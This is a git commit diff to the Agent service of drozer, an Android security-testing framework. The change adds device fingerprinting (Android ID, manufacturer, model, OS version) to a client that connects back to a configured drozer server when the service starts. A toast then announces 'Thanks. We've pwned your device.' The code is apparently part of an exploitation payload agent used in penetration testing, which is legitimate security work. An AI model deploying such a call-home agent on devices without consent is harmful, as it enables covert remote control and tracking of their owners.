0bc99ccd7a71afac24ebf0fc85cbdc50204fa904
Daniel Bradberry <daniel.bradberry@mwrinfosecurity.com>
2013-06-22 10:38:12 +0100

    ensure that we pass the DeviceInfo into the client, and provide some context to the console

--- src/com/mwr/dz/Agent.java
+++ src/com/mwr/dz/Agent.java
@@ -2,10 +2,13 @@ package com.mwr.dz;
 
 import java.io.IOException;
 import java.io.InputStream;
+import java.math.BigInteger;
+import java.security.SecureRandom;
 import java.util.HashMap;
 import java.util.Locale;
 import java.util.Map;
 
+import com.mwr.jdiesel.api.DeviceInfo;
 import com.mwr.jdiesel.api.connectors.Endpoint;
 import com.mwr.jdiesel.api.links.Client;
 
@@ -13,13 +16,38 @@ import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.os.IBinder;
+import android.provider.Settings;
 import android.widget.Toast;
 
 public class Agent extends Service {
 	
+	private static Agent INSTANCE;
+	
 	private Client client;
+	private DeviceInfo device_info;
 	private Endpoint endpoint;
+	private String uid;
 
+	public static Context getContext() {
+		return Agent.INSTANCE.getMercuryContext();
+	}
+	
+	public Context getMercuryContext() {
+		return this.getApplicationContext();
+	}
+
+	public String getUID() {
+		if(this.uid == null)
+			this.uid = Settings.Secure.getString(this.getMercuryContext().getContentResolver(), Settings.Secure.ANDROID_ID);
+
+		// sometimes, a device will not have an ANDROID_ID, particularly if we
+		// are in lower API versions; in that case we generate one at random
+		if(this.uid == null)
+			this.uid = new BigInteger(64, new SecureRandom()).toString(32);
+
+		return this.uid;
+	}
+	
 	@Override
 	public IBinder onBind(Intent intent) {
 		return null;
@@ -29,7 +57,13 @@ public class Agent extends Service {
 	public void onCreate() {
 		super.onCreate();
 		
+		Agent.INSTANCE = this;
+		
 		Configuration configuration = new Configuration(this.getApplicationContext(), R.raw.endpoint);
+		this.device_info = new DeviceInfo(this.getUID(),
+				android.os.Build.MANUFACTURER,
+				android.os.Build.MODEL,
+				android.os.Build.VERSION.RELEASE);
 		this.endpoint = new Endpoint(
 				1,
 				"drozer Server",
@@ -39,7 +73,7 @@ public class Agent extends Service {
 				configuration.get("ts_path"),
 				configuration.get("ts_password"),
 				configuration.get("password"));
-		this.client = new Client(this.endpoint);
+		this.client = new Client(this.endpoint, this.device_info);
 		this.client.start();
 		
 		Toast.makeText(this, String.format(Locale.ENGLISH, "Thanks. We've pwned your device.", endpoint.toConnectionString()), Toast.LENGTH_SHORT).show();
